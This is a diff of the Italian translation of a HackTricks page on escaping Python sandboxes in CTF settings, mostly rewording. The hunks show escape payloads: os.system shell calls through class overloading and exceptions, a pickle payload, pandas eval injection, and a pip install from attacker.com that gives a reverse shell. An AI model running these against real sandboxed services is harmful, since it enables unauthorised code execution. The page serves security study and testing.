@@ -1,4 +1,4 @@
-# Bypassare le sandbox di Python
+# Bypass Python sandboxes
 
 <details>
 
@@ -6,23 +6,23 @@
 
 Altri modi per supportare HackTricks:
 
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-Questi sono alcuni trucchi per bypassare le protezioni delle sandbox di Python ed eseguire comandi arbitrari.
+Questi sono alcuni trucchi per aggirare le protezioni sandbox di Python ed eseguire comandi arbitrari.
 
 ## Librerie di Esecuzione Comandi
 
@@ -62,7 +62,7 @@ system('ls')
 Ricorda che le funzioni _**open**_ e _**read**_ possono essere utili per **leggere file** all'interno della sandbox di Python e per **scrivere del codice** che potresti **eseguire** per **bypassare** la sandbox.
 
 {% hint style="danger" %}
-La funzione **input()** di Python2 consente di eseguire del codice Python prima che il programma vada in crash.
+La funzione **input()** di Python2 consente di eseguire del codice Python prima che il programma si blocchi.
 {% endhint %}
 
 Python cerca di **caricare le librerie dalla directory corrente per prima** (il comando seguente stamperà da dove Python sta caricando i moduli): `python3 -c 'import sys; print(sys.path)'`
@@ -88,7 +88,7 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-Per ulteriori informazioni su come funziona il modulo pickle controlla qui: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+Per ulteriori informazioni su come funziona il modulo pickle controlla questo: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pacchetto Pip
 
@@ -99,18 +99,18 @@ Se hai accesso a `pip` o `pip.main()`, puoi installare un pacchetto arbitrario e
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Puoi scaricare il pacchetto per creare il reverse shell qui. Si prega di notare che prima di usarlo dovresti **decomprimerlo, modificare il `setup.py`, e inserire il tuo IP per il reverse shell**:
+Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare che prima di usarlo dovresti **decomprimerlo, modificare il `setup.py`, e inserire il tuo IP per la reverse shell**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-Questo pacchetto si chiama `Reverse`. Tuttavia, è stato appositamente creato in modo che quando esci dal reverse shell, il resto dell'installazione fallirà, in modo che **non lasci alcun pacchetto Python extra installato sul server** quando te ne vai.
+Questo pacchetto si chiama `Reverse`. Tuttavia, è stato appositamente creato in modo che quando esci dalla reverse shell il resto dell'installazione fallirà, in modo che **non rimanga alcun pacchetto Python extra installato sul server** quando te ne vai.
 {% endhint %}
 
 ## Eval-ing codice Python
 
 {% hint style="warning" %}
-Nota che exec permette stringhe multilinea e ";", ma eval no (controlla l'operatore walrus)
+Nota che exec consente stringhe multilinea e ";", ma eval no (controlla l'operatore walrus)
 {% endhint %}
 
 Se certi caratteri sono vietati, puoi usare la rappresentazione **esadecimale/ottale/B64** per **bypassare** la restrizione:
@@ -159,7 +159,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Eludere le protezioni tramite codifiche (UTF-7)
 
-In [**questo articolo**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 viene utilizzato per caricare ed eseguire codice Python arbitrario all'interno di un sandbox apparente:
+In [**questo articolo**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) viene utilizzato UTF-7 per caricare ed eseguire codice Python arbitrario all'interno di un sandbox apparente:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -200,7 +200,7 @@ class _:pass
 ```
 ### RCE creazione di oggetti e sovraccarico
 
-Se puoi **dichiarare una classe** e **creare un oggetto** di quella classe potresti **scrivere/sovrascrivere diversi metodi** che possono essere **attivati** **senza** **bisogno di chiamarli direttamente**.
+Se puoi **dichiarare una classe** e **creare un oggetto** di quella classe, potresti **scrivere/sovrascrivere diversi metodi** che possono essere **attivati** **senza** **bisogno di chiamarli direttamente**.
 
 #### RCE con classi personalizzate
 
@@ -273,7 +273,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Creazione di oggetti con eccezioni
 
-Quando viene **scatenata un'eccezione**, viene **creato un oggetto** della classe **Exception** senza la necessità di chiamare direttamente il costruttore (un trucco di [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+Quando viene **scatenata un'eccezione**, viene **creato un oggetto** della classe **Exception** senza che tu debba chiamare direttamente il costruttore (un trucco di [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -337,9 +337,9 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### Nessun Builtins
 
 Quando non si dispone di `__builtins__`, non sarà possibile importare nulla né leggere o scrivere file poiché **tutte le funzioni globali** (come `open`, `import`, `print`...) **non sono caricate**.\
-Tuttavia, **per impostazione predefinita, Python importa molteplici moduli in memoria**. Questi moduli possono sembrare benigni, ma alcuni di essi **importano anche funzionalità pericolose** al loro interno che possono essere accessibili per ottenere persino **esecuzione di codice arbitrario**.
+Tuttavia, **di default Python importa molteplici moduli in memoria**. Questi moduli possono sembrare benigni, ma alcuni di essi **importano anche funzionalità pericolose** al loro interno che possono essere accessibili per ottenere persino **esecuzione di codice arbitrario**.
 
-Nei seguenti esempi è possibile osservare come **abusare** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità pericolose** al loro interno.
+Negli esempi seguenti è possibile osservare come **abusare** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità pericolose** al loro interno.
 
 **Python2**
 ```python
@@ -684,9 +684,9 @@ Puoi controllare l'output di questo script su questa pagina:
 [broken-reference](broken-reference/)
 {% endcontent-ref %}
 
-## Stringa di formato Python
+## Stringa di Formato Python
 
-Se **invii** una **stringa** a python che verrà **formattata**, puoi usare `{}` per accedere alle **informazioni interne di python**. Puoi utilizzare gli esempi precedenti per accedere a globali o builtins, ad esempio.
+Se **invii** una **stringa** a python che verrà **formattata**, puoi usare `{}` per accedere alle **informazioni interne di python**. Puoi utilizzare gli esempi precedenti per accedere a globali o builtins ad esempio.
 
 {% hint style="info" %}
 Tuttavia, c'è una **limitazione**, puoi utilizzare solo i simboli `.[]`, quindi **non sarai in grado di eseguire codice arbitrario**, solo di leggere informazioni.\
@@ -734,7 +734,7 @@ return 'HAL 9000'
 **Altri esempi** sugli esempi di **formato stringa** possono essere trovati su [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Controlla anche la seguente pagina per i gadget che leggeranno **informazioni sensibili dagli oggetti interni di Python**:
+Controlla anche la seguente pagina per i gadget che **leggono informazioni sensibili dagli oggetti interni di Python**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -752,7 +752,7 @@ Controlla anche la seguente pagina per i gadget che leggeranno **informazioni se
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
-## Analisi degli Oggetti Python
+## Dissertare sugli oggetti Python
 
 {% hint style="info" %}
 Se vuoi **approfondire** la conoscenza del **bytecode di Python**, leggi questo **fantastico** articolo sull'argomento: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
@@ -780,7 +780,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` e `func_globals` (Stesso) Ottiene l'ambiente globale. Nell'esempio è possibile vedere alcuni moduli importati, alcune variabili globali e il loro contenuto dichiarato:
+`__globals__` e `func_globals` (Stesso) Ottiene l'ambiente globale. Nell'esempio puoi vedere alcuni moduli importati, alcune variabili globali e il loro contenuto dichiarato:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -881,7 +881,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Si noti che **se non è possibile importare `dis` nella sandbox di Python** è possibile ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non sarà possibile visualizzare il contenuto delle variabili caricate (`LOAD_CONST`), ma è possibile indovinarle da (`get_flag.func_code.co_consts`) poiché `LOAD_CONST` indica anche l'offset della variabile caricata.
+Nota che **se non puoi importare `dis` nella sandbox di Python** puoi ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non vedrai il contenuto delle variabili caricate (`LOAD_CONST`) ma puoi indovinarle da (`get_flag.func_code.co_consts`) perché `LOAD_CONST` indica anche l'offset della variabile caricata.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -952,7 +952,7 @@ types.CodeType.__doc__
 ### Ricreare una funzione trapelata
 
 {% hint style="warning" %}
-Nell'esempio seguente, prenderemo tutti i dati necessari per ricreare la funzione direttamente dall'oggetto codice della funzione. In un **esempio reale**, tutti i **valori** per eseguire la funzione **`code_type`** sono ciò di cui avrai bisogno per il **leak**.
+Nell'esempio seguente, prenderemo tutti i dati necessari per ricreare la funzione direttamente dall'oggetto codice della funzione. In un **esempio reale**, tutti i **valori** per eseguire la funzione **`code_type`** sono ciò di cui avrai bisogno per **effettuare un leak**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -966,8 +966,8 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Eludere le difese
 
-Negli esempi precedenti all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice Python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto il resto in **una sola riga** (e potremmo fare lo stesso usando **`exec`**).\
-In ogni caso, a volte potrebbe essere utile **creare** un **oggetto compilato** in una macchina locale ed eseguirlo nella **macchina CTF** (ad esempio perché non abbiamo la funzione `compiled` nel CTF).
+Nei precedenti esempi all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice Python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto il resto in **una sola riga** (e potremmo fare lo stesso usando **`exec`**).\
+In ogni caso, a volte potrebbe essere utile **creare** un **oggetto compilato** in una macchina locale ed eseguirlo nella **macchina CTF** (ad esempio perché non abbiamo la funzione `compile` nel CTF).
 
 Ad esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
 ```python
@@ -1018,7 +1018,7 @@ Utilizzando strumenti come [**https://www.decompiler.com/**](https://www.decompi
 
 ### Assert
 
-Python eseguito con ottimizzazioni con il parametro `-O` rimuoverà le istruzioni assert e qualsiasi codice condizionale sul valore di **debug**.\
+Python eseguito con ottimizzazioni con il parametro `-O` rimuoverà le istruzioni assert e qualsiasi codice condizionale basato sul valore di **debug**.\
 Pertanto, controlli come
 ```python
 def check_permission(super_user):
@@ -1028,7 +1028,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
-sarà aggirato
+sarà bypassato
 
 ## Riferimenti
 
@@ -1041,7 +1041,7 @@ sarà aggirato
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -1053,8 +1053,8 @@ Altri modi per supportare HackTricks:
 
 * Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
